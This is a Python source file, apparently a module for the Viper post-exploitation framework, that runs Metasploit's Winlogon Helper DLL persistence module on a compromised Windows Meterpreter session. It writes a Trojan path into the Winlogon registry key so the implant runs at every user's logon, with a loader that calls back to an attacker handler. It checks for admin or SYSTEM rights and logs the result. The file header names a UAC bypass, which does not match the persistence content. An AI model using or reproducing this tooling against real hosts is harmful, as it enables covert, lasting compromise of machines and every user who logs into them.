# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Winlogon Helper DLL持久化"
    DESC_ZH = "通过在注册表\nHKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\n" \
              "写入木马文件路径实现持久化.\n" \
              "模块需要管理员或SYSTEM权限.\n" \
              "持久化会对所有登录主机的用户生效（本地用户，域用户）\n" \
              "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."

    NAME_EN = "Winlogon Helper DLL persistence"
    DESC_EN = "Through the registry HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\n" \
              "Write the path of the Trojan file to achieve persistence.\n" \
              "The module requires administrator or SYSTEM privileges.\n" \
              "Persistence will take effect for all users who login to the host (local users, domain users)\n" \
              "When using the module, do not turn off the corresponding handler, the Loader needs to be connected back to the monitoring to obtain the core library files."

    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1004"]  # ATTCK向量
    AUTHOR = ["Viper"]
    README = ["https://www.yuque.com/vipersec/module/komy9n"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1004/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_winlogon_helper_dll"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        # 检查权限
        if session.is_admin or session.is_system:
            pass
        else:
            return False, "当前Session必须拥有系统权限或管理员权限", "The current Session must have system permissions or administrator permissions"

        self.set_payload_by_handler()
        if 'windows' not in self.opts.get('PAYLOAD').lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"

        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"EXE路径: {data}", f"EXE path: {data}")
            self.log_good(f"用户下次登录时生效", "Take effect the next time the user login")
            self.cache_handler()
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
